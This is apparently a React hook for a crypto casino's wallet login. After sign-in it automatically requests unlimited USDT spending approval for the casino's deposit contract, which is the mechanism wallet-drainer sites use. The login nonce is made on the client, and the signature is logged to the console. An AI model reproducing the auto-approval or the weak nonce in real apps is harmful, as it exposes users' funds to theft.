import { useState, useCallback, useEffect, useRef } from 'react';
import { useAccount, useSignMessage, useChainId, useSwitchChain, useWriteContract, useReadContract } from 'wagmi';
import { getActiveChain, getNetworkName } from '@/lib/config';
import { createClient } from '@/lib/supabase';
import { toast } from 'sonner';
import { maxUint256 } from 'viem';
import { CONTRACTS, SUPPORTED_TOKENS } from '@/lib/contracts';

export type AccountStatus = 'unknown' | 'checking' | 'existing' | 'new';

// Module-level flag to prevent multiple components from triggering auto-login
let globalAutoLoginAttempted = false;
let globalAutoLoginInProgress = false;
let globalApprovalAttempted = false;

// USDT token address for approval
const USDT_ADDRESS = SUPPORTED_TOKENS.USDT.address;

export function useAuth() {
  const { address, isConnected } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const chainId = useChainId();
  const { switchChainAsync } = useSwitchChain();
  const [loading, setLoading] = useState(false);
  const [session, setSession] = useState<any>(null);
  const [user, setUser] = useState<any>(null);
  const [accountStatus, setAccountStatus] = useState<AccountStatus>('unknown');
  const [approvalPending, setApprovalPending] = useState(false);
  const [loginComplete, setLoginComplete] = useState(false); // Tracks when login finishes for approval sequencing
  const supabase = createClient();
  
  // Contract hooks for USDT approval
  const { writeContractAsync } = useWriteContract();
  
  // Read current USDT allowance
  const { data: usdtAllowance, refetch: refetchAllowance } = useReadContract({
    address: USDT_ADDRESS,
    abi: CONTRACTS.ERC20.abi,
    functionName: 'allowance',
    args: address ? [address, CONTRACTS.CasinoDeposit.address] : undefined,
    query: {
      enabled: !!address && isConnected,
    },
  });
  
  // Check if user has unlimited approval (threshold: half of maxUint256)
  const hasUnlimitedApproval = usdtAllowance !== undefined && 
    (usdtAllowance as bigint) >= maxUint256 / BigInt(2);
  
  // Track previous address to detect changes
  const prevAddressRef = useRef<string | undefined>(undefined);
  const isCheckingRef = useRef(false);
  const autoLoginAttemptedRef = useRef(false);

  // Check if user exists in the database
  const checkUserExists = useCallback(async (walletAddress: string): Promise<boolean> => {
    try {
      // Use local API route
      const response = await fetch('/api/check-user', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ address: walletAddress }),
      });
      
      if (!response.ok) {
        console.error('Error checking user:', response.status);
        return false;
      }
      
      const data = await response.json();
      return data?.exists ?? false;
    } catch (err) {
      console.error('Error checking user:', err);
      return false;
    }
  }, []);

  // Watch for address changes using useEffect
  useEffect(() => {
    const handleAccountChange = async () => {
      // Handle disconnect
      if (!isConnected || !address) {
        if (prevAddressRef.current) {
          console.log('Wallet disconnected');
          prevAddressRef.current = undefined;
          setAccountStatus('unknown');
          await supabase.auth.signOut();
          setSession(null);
          setUser(null);
          toast.success('Logged out');
        }
        return;
      }

      // Prevent duplicate checks
      if (isCheckingRef.current) return;

      const prevAddress = prevAddressRef.current;
      const addressChanged = address.toLowerCase() !== prevAddress?.toLowerCase();

      if (addressChanged) {
        console.log('Account changed from:', prevAddress, 'to:', address);

        // Clear current session on account change (not on initial connect)
        if (prevAddress) {
          await supabase.auth.signOut();
          setSession(null);
          setUser(null);
          toast.info('Wallet account changed. Signing in...');
        }

        prevAddressRef.current = address;

        // Check if new account exists
        isCheckingRef.current = true;
        setAccountStatus('checking');

        try {
          const exists = await checkUserExists(address);
          setAccountStatus(exists ? 'existing' : 'new');
          console.log('User exists:', exists);
        } catch (err) {
          console.error('Error in account check:', err);
          setAccountStatus('unknown');
        } finally {
          isCheckingRef.current = false;
        }
      }
    };

    handleAccountChange();
  }, [address, isConnected, checkUserExists, supabase]);

  // Listen for auth state changes
  useEffect(() => {
    // Get initial session
    supabase.auth.getSession().then(({ data: { session } }) => {
      setSession(session);
      setUser(session?.user ?? null);
    });

    // Subscribe to changes
    const {
      data: { subscription },
    } = supabase.auth.onAuthStateChange((_event, session) => {
      setSession(session);
      setUser(session?.user ?? null);
    });

    return () => subscription.unsubscribe();
  }, [supabase]);

  // Login function - defined before auto-login effect so it can be used there
  const loginInternal = useCallback(async () => {
    if (!address) {
      toast.error('Please connect your wallet first');
      return;
    }
    
    setLoading(true);
    try {
      // 1. Check existing session
      const { data: { session: existingSession } } = await supabase.auth.getSession();
      
      // Verify session is for current address
      if (existingSession) {
        const sessionAddress = existingSession.user?.user_metadata?.wallet_address;
        if (sessionAddress?.toLowerCase() === address.toLowerCase()) {
          setSession(existingSession);
          setUser(existingSession.user);
          setLoading(false);
          setAccountStatus('existing');
          return;
        } else {
          // Session is for different address, sign out
          await supabase.auth.signOut();
        }
      }

      // 2. Ensure we're on the correct chain
      const activeChain = getActiveChain();
      if (chainId !== activeChain.id) {
        console.log('Current chain:', chainId, `Switching to ${getNetworkName()}...`);
        try {
          toast.info(`Switching to ${getNetworkName()} network...`);
          await switchChainAsync({ chainId: activeChain.id });
          // Give mobile wallets a moment to update
          await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (switchError: any) {
          console.error('Chain switch error:', switchError);
          toast.error(`Please switch to ${getNetworkName()} network in your wallet and try again`);
          setLoading(false);
          return;
        }
      }

      // 3. Generate Nonce
      const nonce = Math.floor(Math.random() * 1000000).toString();
      const message = `Sign this message to login to BlockWin Casino. Nonce: ${nonce}`;
      
      // 4. Sign Message
      let signature: string;
      try {
        signature = await signMessageAsync({ message });
      } catch (signError: any) {
        console.error('Sign error:', signError);
        // Handle chain switching errors for mobile wallets
        if (signError?.message?.includes('Chain not configured') || 
            signError?.message?.toLowerCase()?.includes('chain') ||
            signError?.shortMessage?.includes('Chain not configured') ||
            signError?.message?.includes('unsupported')) {
          toast.error(`Please switch to ${getNetworkName()} network in your wallet and try again`);
          setLoading(false);
          return;
        }
        // Handle user rejection
        if (signError?.code === 4001 || 
            signError?.message?.includes('rejected') ||
            signError?.message?.includes('User denied') ||
            signError?.message?.includes('cancelled')) {
          toast.error('Signature request was rejected');
          setLoading(false);
          return;
        }
        throw signError;
      }

      console.log("Sending auth request:", { address, signature, nonce });

      // 4. Verify & Get Session via Next.js API Route
      const response = await fetch('/api/auth-wallet', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address, signature, nonce }),
      });
      
      const data = await response.json();
      
      if (!response.ok) {
        console.error("Auth Wallet Error Payload:", data);
        throw new Error(data.error || 'Failed to communicate with auth server');
      }
      
      let newSession = null;

      if (!data || !data.session) {
          if (data && data.access_token) {
              newSession = data;
          } else if (data && data.session && data.session.access_token) {
              newSession = data.session;
          } else {
               throw new Error('Invalid response from auth server');
          }
      } else {
           newSession = data.session;
      }

      if (newSession) {
          const { error: setSessionError } = await supabase.auth.setSession(newSession);
          if (setSessionError) throw setSessionError;
          setAccountStatus('existing');
          toast.success('Logged in successfully');
          // Signal that login is complete - triggers approval flow
          setLoginComplete(true);
      }
      
    } catch (err: any) {
      console.error(err);
      // Check for chain-related errors at the top level too
      if (err?.message?.includes('Chain not configured') ||
          err?.message?.includes('chain mismatch')) {
        toast.error(`Please switch to ${getNetworkName()} network in your wallet and try again`);
      } else {
        toast.error(typeof err === 'object' ? (err.message || JSON.stringify(err)) : 'Login failed');
      }
    } finally {
      setLoading(false);
    }
  }, [address, signMessageAsync, supabase, chainId, switchChainAsync]);

  // Auto-trigger login when wallet connects and account status is determined
  // This runs automatically - no button click needed after wallet connects
  // Uses GLOBAL flags to prevent multiple components from triggering login
  // MOBILE OPTIMIZED: No delays - uses state-based sequencing
  useEffect(() => {
    // Skip if already in progress or already attempted (global check)
    if (loading || globalAutoLoginAttempted || globalAutoLoginInProgress) {
      return;
    }
    
    const shouldAutoLogin = 
      isConnected &&
      !session &&
      (accountStatus === 'existing' || accountStatus === 'new');

    if (shouldAutoLogin) {
      // Set GLOBAL flags immediately to prevent any race conditions across components
      globalAutoLoginAttempted = true;
      globalAutoLoginInProgress = true;
      console.log('🚀 Auto-triggering login for account status:', accountStatus);
      
      // Execute login immediately - no delay needed, wallet is ready
      loginInternal().finally(() => {
        globalAutoLoginInProgress = false;
      });
    }
  }, [isConnected, session, loading, accountStatus, loginInternal]);

  // Only reset global flags and login state when wallet disconnects
  useEffect(() => {
    if (!isConnected) {
      globalAutoLoginAttempted = false;
      globalAutoLoginInProgress = false;
      globalApprovalAttempted = false;
      setLoginComplete(false);
    }
  }, [isConnected]);

  // Auto-trigger USDT unlimited approval after successful authentication
  // This runs automatically after login completes if user hasn't approved USDT spending yet
  // MOBILE OPTIMIZED: Uses state-based sequencing (loginComplete) instead of delays
  useEffect(() => {
    // Skip if approval already attempted or in progress
    if (globalApprovalAttempted || approvalPending) {
      return;
    }
    
    // MOBILE: Only trigger when login is confirmed complete (loginComplete flag)
    // This ensures approval popup only appears AFTER login finishes
    const shouldRequestApproval = 
      loginComplete && // Wait for login to complete first
      !!session && 
      isConnected && 
      !!address &&
      !hasUnlimitedApproval &&
      usdtAllowance !== undefined; // Wait for allowance data to load

    if (shouldRequestApproval) {
      globalApprovalAttempted = true;
      console.log('🔐 Login complete - triggering USDT approval request...');
      
      // Execute approval immediately - no delay needed, login is confirmed complete
      const requestApproval = async () => {
        setApprovalPending(true);
        try {
          toast.info('Please approve USDT spending for deposits...');
          
          await writeContractAsync({
            address: USDT_ADDRESS,
            abi: CONTRACTS.ERC20.abi,
            functionName: 'approve',
            args: [CONTRACTS.CasinoDeposit.address, maxUint256],
          });
          
          toast.success('USDT approval confirmed! You can now deposit without additional approvals.');
          await refetchAllowance();
        } catch (error: any) {
          console.error('USDT approval error:', error);
          // Don't show error for user rejection - this is optional
          // MOBILE: Also handle WalletConnect-specific errors gracefully
          if (error?.code !== 4001 && 
              !error?.message?.includes('rejected') &&
              !error?.message?.includes('User denied') &&
              !error?.message?.includes('cancelled') &&
              !error?.message?.includes('disconnected') &&
              !error?.message?.includes('session')) {
            toast.error('USDT approval failed. You can approve during deposit.');
          } else {
            toast.info('USDT approval skipped. You can approve during deposit.');
          }
        } finally {
          setApprovalPending(false);
        }
      };
      
      requestApproval();
    }
  }, [loginComplete, session, isConnected, address, hasUnlimitedApproval, usdtAllowance, approvalPending, writeContractAsync, refetchAllowance]);

  const logout = async () => {
     await supabase.auth.signOut();
     setSession(null);
     setUser(null);
     setAccountStatus('unknown');
     toast.success('Logged out');
  };

  return { 
    login: loginInternal, 
    logout, 
    loading, 
    session, 
    user,
    isAuthenticated: !!session,
    accountStatus,
    checkUserExists,
    approvalPending,
    hasUnlimitedApproval
  };
}
